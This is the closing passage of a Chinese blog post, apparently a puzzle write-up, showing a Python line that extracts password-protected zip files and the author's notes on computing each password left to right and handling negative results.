zfile<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span><span class="token string">'.'</span><span class="token punctuation">,</span>pwd<span class="token operator">=</span>password1<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>在跑完20多分钟后才出，脚本老是报错。<br> <img src="https://images2.imgbox.com/f8/5a/p42chW00_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/b2/ac/iIcYy0Oe_o.png" alt="在这里插入图片描述"></p> 
<p>有一些坑的地方，首先是他的密码出来后要运算，运算顺序是从左往右，无视算式优先级规则，所以需要编一个规则来符合。<br> 第二是出现的结果也就是密码会出现负数，需要替换结果后再提交。</p> 
<p>PS：python 的缩进害死人。</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/e7af4db670729c0791a38e5735197152/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Python数据开发实战-连接clickhouse读取数据返回dataframe格式（附源码和实现效果）</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/f708685c1d10c4b851bc1e1ee4e0dda7/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Linux 安装 jdk</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>